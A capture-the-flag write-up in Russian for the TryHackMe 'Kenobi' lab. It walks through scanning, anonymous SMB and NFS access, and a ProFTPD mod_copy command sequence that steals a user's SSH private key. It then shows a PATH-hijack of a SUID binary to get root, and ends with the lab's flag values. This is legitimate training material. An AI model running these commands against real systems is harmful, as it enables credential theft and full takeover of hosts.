# TryHackMe - Kenobi

📅 Дата: 2025-07-02  
🧠 Сложность: easy  
💻 IP-адрес: 10.10.168.236  

---

## Sugar

```bash
nmap_ctf() {
  local ip=$1
  sudo nmap -sS -p- -n --max-parallelism 100 --min-rate 1000 -v -oN nmap-sS.txt $ip && nmap -sT -Pn -sV -T4 -A -v -p "$(grep -oP \"^[0-9]+(?=/tcp\s+open)\" nmap-sS.txt | sort -n | paste -sd \",\")" -oN nmap-sV.txt $ip
}
```


## 🔍 Сканирование

```bash
export ip=10.10.168.236 && nmap_ctf $ip
```

🖼️ Nmap скан:

```bash
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      43403/tcp6  mountd
|   100005  1,2,3      43895/tcp   mountd
|   100005  1,2,3      48963/udp   mountd
|   100005  1,2,3      58565/udp6  mountd
|   100021  1,3,4      34435/tcp6  nlockmgr
|   100021  1,3,4      35103/tcp   nlockmgr
|   100021  1,3,4      46780/udp6  nlockmgr
|   100021  1,3,4      59879/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs         2-4 (RPC #100003)
35103/tcp open  nlockmgr    1-4 (RPC #100021)
37029/tcp open  mountd      1-3 (RPC #100005)
43895/tcp open  mountd      1-3 (RPC #100005)
58605/tcp open  mountd      1-3 (RPC #100005)
```

---

## 🕵️ Enumeration

### SMB
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Kenobi/scans]
└─$ sudo nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $ip
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 08:54 EDT
Nmap scan report for 10.10.168.236
Host is up (0.21s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.168.236\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.168.236\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.168.236\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 33.63 seconds
```

Есть шара с анонимным доступом:
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Kenobi/exploits]
└─$ smbclient //$ip/anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
mkfifo         more           mput           newer          notify         
open           posix          posix_encrypt  posix_open     posix_mkdir    
posix_rmdir    posix_unlink   posix_whoami   print          prompt         
put            pwd            q              queue          quit           
readlink       rd             recurse        reget          rename         
reput          rm             rmdir          showacls       setea          
setmode        scopy          stat           symlink        tar            
tarmode        timeout        translate      unlock         volume         
vuid           wdel           logon          listconnect    showconnect    
tcon           tdis           tid            utimes         logoff         
..             !              
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877100 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (13.8 KiloBytes/sec) (average 13.8 KiloBytes/sec)
smb: \> exit
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Kenobi/exploits]
└─$ ls
log.txt
```

### rpcbind
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Kenobi/exploits]
└─$ sudo nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $ip
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 09:37 EDT
Nmap scan report for 10.10.168.236
Host is up (0.22s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836532.0  6877096.0  22%   16.0T        32000

Nmap done: 1 IP address (1 host up) scanned in 5.26 seconds
```


## 📂 Получение доступа

Эксплуатирую SITE CPFR и SITE CPTO у ProFTPD 1.3.5.
Копирую **/home/kenobi/.ssh/id_rsa** в **/var/tmp/id_rsa**
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Kenobi/exploits]
└─$ nc $ip 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.168.236]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

Монтирую директорию:
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Kenobi]
└─$ mkdir nfs
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Kenobi]
└─$ ls
exploits  nfs  scans  screenshots  writeup.md
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Kenobi]
└─$ sudo mount -o rw $ip:/var ./nfs          
[sudo] password for kali: 
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Kenobi]
└─$ cd nfs              
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Kenobi/nfs]
└─$ ls -la
total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxrwxr-x  6 kali kali  4096 Jul  2 09:57 ..
drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root avahi 4096 Sep  4  2019 log
drwxrwsr-x  2 root mail  4096 Feb 26  2019 mail
drwxr-xr-x  2 root root  4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root  4096 Jan 29  2019 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt  6 root root  4096 Jul  2 09:52 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www
```

Копирую **id_rsa** к себе, меняю разрешения на чтение только для текущего пользователя (**600**) и подключаюсь по ssh:
```bash
┌──(kali㉿0x2d-pentest)-[~/…/thm/Kenobi/nfs/tmp]
└─$ cd ../../exploits   
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Kenobi/exploits]
└─$ cp ../nfs/tmp/id_rsa .
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Kenobi/exploits]
└─$ ls    
id_rsa  log.txt
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Kenobi/exploits]
└─$ ls -la
total 24
drwxrwxr-x 2 kali kali  4096 Jul  2 10:14 .
drwxrwxr-x 6 kali kali  4096 Jul  2 09:57 ..
-rw-r--r-- 1 kali kali  1675 Jul  2 10:14 id_rsa
-rw-r--r-- 1 kali kali 12237 Jul  2 09:20 log.txt
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Kenobi/exploits]
└─$ chmod 600 id_rsa      
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Kenobi/exploits]
└─$ ls -la
total 24
drwxrwxr-x 2 kali kali  4096 Jul  2 10:14 .
drwxrwxr-x 6 kali kali  4096 Jul  2 09:57 ..
-rw------- 1 kali kali  1675 Jul  2 10:14 id_rsa
-rw-r--r-- 1 kali kali 12237 Jul  2 09:20 log.txt
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Kenobi/exploits]
└─$ ssh -i id_rsa kenobi@$ip
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ 
```


## ⚙️ Привилегии

Ищу SUID files:
```bash
kenobi@kenobi:~$ find / -type f -perm -04000 -ls 2>/dev/null
   279750     96 -rwsr-xr-x   1 root     root        94240 May  8  2019 /sbin/mount.nfs
   277766     16 -rwsr-xr-x   1 root     root        14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
   276573     44 -rwsr-xr--   1 root     messagebus    42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   277903    100 -rwsr-sr-x   1 root     root          98440 Jan 29  2019 /usr/lib/snapd/snap-confine
   260788     12 -rwsr-xr-x   1 root     root          10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
   276950    420 -rwsr-xr-x   1 root     root         428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
   275955     40 -rwsr-xr-x   1 root     root          38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
   260462     52 -rwsr-xr-x   1 root     root          49584 May 16  2017 /usr/bin/chfn
   275975     36 -rwsr-xr-x   1 root     root          32944 May 16  2017 /usr/bin/newgidmap
   277767     24 -rwsr-xr-x   1 root     root          23376 Jan 15  2019 /usr/bin/pkexec
   260602     56 -rwsr-xr-x   1 root     root          54256 May 16  2017 /usr/bin/passwd
   275974     36 -rwsr-xr-x   1 root     root          32944 May 16  2017 /usr/bin/newuidmap
   260525     76 -rwsr-xr-x   1 root     root          75304 May 16  2017 /usr/bin/gpasswd
   280011     12 -rwsr-xr-x   1 root     root           8880 Sep  4  2019 /usr/bin/menu
   260686    136 -rwsr-xr-x   1 root     root         136808 Jul  4  2017 /usr/bin/sudo
   260464     40 -rwsr-xr-x   1 root     root          40432 May 16  2017 /usr/bin/chsh
   277159     52 -rwsr-sr-x   1 daemon   daemon        51464 Jan 14  2016 /usr/bin/at
   260591     40 -rwsr-xr-x   1 root     root          39904 May 16  2017 /usr/bin/newgrp
   260206     28 -rwsr-xr-x   1 root     root          27608 May 16  2018 /bin/umount
   276584     32 -rwsr-xr-x   1 root     root          30800 Jul 12  2016 /bin/fusermount
   260157     40 -rwsr-xr-x   1 root     root          40152 May 16  2018 /bin/mount
   260171     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /bin/ping
   260188     40 -rwsr-xr-x   1 root     root          40128 May 16  2017 /bin/su
   260172     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /bin/ping6
```

Есть неизвестный
```bash
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Wed, 02 Jul 2025 14:31:44 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html
```

strings показывает, что вызывается **curl**, **uname**, **ifconfig** без полных путей  **/usr/bin/curl** или **/usr/bin/uname** или **/sbin/ifconfig**
```bash
kenobi@kenobi:~$ strings /usr/bin/menu
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
...
...
```

Смотрю список директорий, куда могу записывать.
```bash
kenobi@kenobi:~$ find / -writable -type d 2>/dev/null
/var/crash
/var/spool/samba
/var/tmp
/var/lib/samba/usershares
/var/lib/lxcfs/proc
/var/lib/lxcfs/cgroup
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/proc/1875/task/1875/fd
/proc/1875/fd
/proc/1875/map_files
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/tmp
/tmp/.XIM-unix
/tmp/.font-unix
/tmp/.X11-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/home/kenobi
/home/kenobi/.ssh
/home/kenobi/.cache
/home/kenobi/share
/run/user/1000
/run/user/1000/systemd
/run/lock
/dev/mqueue
/dev/shm
```

Есть разрешение на запись в текущую директорию
```bash
kenobi@kenobi:~$ pwd
/home/kenobi
```

Копирую */bin/sh* в текущую директорию, чтобы *menu* запустил её от *root*
```bash
kenobi@kenobi:~$ which sh
/bin/sh
kenobi@kenobi:~$ cp /bin/sh ./ifconfig
kenobi@kenobi:~$ chmod 777 ifconfig
kenobi@kenobi:~$ ls -la
total 44
drwxr-xr-x 5 kenobi kenobi 4096 Jul  2 09:47 .
drwxr-xr-x 3 root   root   4096 Sep  4  2019 ..
lrwxrwxrwx 1 root   root      9 Sep  4  2019 .bash_history -> /dev/null
-rw-r--r-- 1 kenobi kenobi  220 Sep  4  2019 .bash_logout
-rw-r--r-- 1 kenobi kenobi 3771 Sep  4  2019 .bashrc
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .cache
-rwxrwxrwx 1 kenobi kenobi    8 Jul  2 09:48 ifconfig
-rw-r--r-- 1 kenobi kenobi  655 Sep  4  2019 .profile
drwxr-xr-x 2 kenobi kenobi 4096 Sep  4  2019 share
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .ssh
-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt
-rw------- 1 kenobi kenobi  642 Sep  4  2019 .viminfo
```

Добавляю в начало PATH директорию с фейковым ifconfig и получаю root
```bash
kenobi@kenobi:~$ echo $PATH
/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
kenobi@kenobi:~$ export PATH=$(pwd):$PATH
kenobi@kenobi:~$ echo $PATH
/home/kenobi:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```


## 🏁 Флаги

- User flag: d0b0f3f53b6caa532a83915e19224899 
- Root flag: 177b3cd8562289f37382721c28381f02 

---
